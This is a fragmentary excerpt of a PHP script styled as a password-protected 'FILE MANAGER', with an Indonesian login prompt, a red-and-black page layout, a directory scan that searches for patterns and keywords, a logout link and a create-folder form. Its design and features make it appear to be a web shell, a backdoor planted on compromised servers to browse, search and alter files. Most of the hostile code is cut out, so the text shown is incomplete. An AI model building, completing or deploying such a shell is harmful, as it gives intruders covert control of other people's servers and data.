...
if (!isset($_SESSION['filemanager_logged_in']) || $_SESSION['filemanager_logged_in'] !== true) {
    if (isset($_POST['password'])) {
        if ($_POST['password'] === $config_password) {
            $_SESSION['filemanager_logged_in'] = true;
    ...
    <head>
        ...
        <style>
            body{background:#111;color:#eee;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
            .login-box{background:#1a1a1a;border:2px solid #ff0000;padding:40px;border-radius:10px;width:350px;text-align:center}
            .login-box h2{color:#ff0000;margin-bottom:20px}
            .login-box input[type="password"]{width:100%;padding:12px;background:#000;color:#0f0;border:1px solid #ff0000;border-radius:5px;font-size:16px;margin-bottom:15px;box-sizing:border-box}
            .login-box button{width:100%;padding:12px;background:#ff0000;color:#fff;border:none;border-radius:5px;font-size:16px;cursor:pointer;font-weight:bold}
            .login-box button:hover{background:#cc0000}
            .error-msg{color:#ff4444;margin-bottom:15px;padding:10px;background:#280000;border-radius:5px}
            .logo-img{max-width:150px;margin-bottom:20px}
        </style>
    </head>
    <body>
        <div class="login-box">
            <img src="https://veldrive.com/NBCy1vy7/logo.png" class="logo-img" alt="Logo">
            <h2>🔐 FILE MANAGER</h2>
            <p style="color:#888;font-size:14px;margin-bottom:20px">Masukkan password untuk melanjutkan</p>
...
if (isset($_POST['scan_files'])) {
    ...
    function scanDirectory($dir, &$results, $patterns, $keywords) {
        ...
        foreach ($items as $item) {
            ...
            if (is_file($fullPath) && filesize($fullPath) > 10485760) {
                continue;
            }
...
<div style="display:flex;justify-content:space-between;align-items:center">
    ...
    <div style="display:flex;align-items:center;gap:10px;">
        <span style="color:#00ff6a;font-size:12px;">🔓 Active</span>
        <a href="?logout=1" style="background:#ff0000;color:#fff;padding:5px 15px;border-radius:5px;text-decoration:none;font-size:14px;">
            Logout
        </a>
...
<div class="action-row">
    ...
    <div class="action-box">
        ...
        <form method="post">
            <input name="foldername"><button type="submit" name="newfolder">Create</button>
        </form>
